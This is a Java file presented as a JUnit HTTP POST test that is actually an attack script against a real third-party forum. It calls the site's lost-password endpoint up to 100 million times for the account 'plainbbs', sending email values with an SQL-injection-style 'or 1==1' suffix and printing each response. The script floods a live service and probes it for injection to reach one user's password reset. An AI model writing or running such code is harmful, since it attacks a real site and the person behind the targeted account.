package work.ken.tools;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.HttpStatus;
import org.apache.commons.httpclient.NameValuePair;
import org.apache.commons.httpclient.methods.PostMethod;
import org.junit.Before;
import org.junit.Test;


public class HttpClientPostTest {
	@Before
	public void setUp() throws Exception {

	}
	
	@Test
	public void testSuccessfulSubmit() {
		
		for(int i=1; i<100000000; i++){
			long start = System.currentTimeMillis();
			httpGetTest(i);
			System.out.println( System.currentTimeMillis()-start);
		}

	 }

	private void httpGetTest(int hash) {
		// Create an instance of HttpClient.
		  HttpClient client = new HttpClient();
		  //client.getParams().setParameter("http.useragent", "Test Client");

		    BufferedReader br = null;

		    PostMethod method = new PostMethod("http://www.oursteps.com.au/bbs/member.php?mod=lostpasswd&lostpwsubmit=yes&infloat=yes&inajax=1");
		    
	        NameValuePair[] data = {
	                new NameValuePair("formhash", "0cde910a"),
	                new NameValuePair("handlekey", "lostpwform"),
	                new NameValuePair("username", "plainbbs"),
	                new NameValuePair("email", "plainbbs@gmail"+hash+".com or 1==1"),      
	                new NameValuePair("lostpwsubmit", "true")
	              };
	        method.setRequestBody(data);
		    method.addParameter("formhash", "0cde910a");
		    method.addParameter("handlekey", "lostpwform");
		    method.addParameter("username", "plainbbs");
		    method.addParameter("email", "plainbbs@gmail.com or 1==1");
		    method.addParameter("lostpwsubmit", "true");    

		    try{
		      int returnCode = client.executeMethod(method);

		      if(returnCode == HttpStatus.SC_NOT_IMPLEMENTED) {
		        System.err.println("The Post method is not implemented by this URI");
		        // still consume the response body
		        method.getResponseBodyAsString();
		      } else {
		        br = new BufferedReader(new InputStreamReader(method.getResponseBodyAsStream()));
		        String readLine;
		        while(((readLine = br.readLine()) != null)) {
		          System.err.println(readLine);
		      }
		      }
		    } catch (Exception e) {
		      System.err.println(e);
		    } finally {
		      method.releaseConnection();
		      if(br != null) try { br.close(); } catch (Exception fe) {}
		    }
	}

	  

}
